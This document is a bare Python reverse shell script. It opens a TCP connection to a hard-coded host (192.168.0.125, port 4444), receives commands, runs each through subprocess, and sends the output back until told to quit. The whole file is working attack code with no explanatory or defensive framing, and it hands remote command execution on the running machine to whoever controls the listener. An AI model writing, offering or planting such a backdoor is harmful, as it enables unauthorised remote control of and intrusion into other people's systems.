import socket
import subprocess

REMOTE_HOST = '192.168.0.125'
REMOTE_PORT = 4444

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((REMOTE_HOST,REMOTE_PORT))
    while True:
        command = client.recv(1024)
        decode_command = command.decode()
        print(decode_command)
        if (decode_command == "exit" or decode_command == "quit" or decode_command == "x" or decode_command == "q"):
            break
        output = subprocess.getoutput(decode_command)
        client.send(output.encode())

main()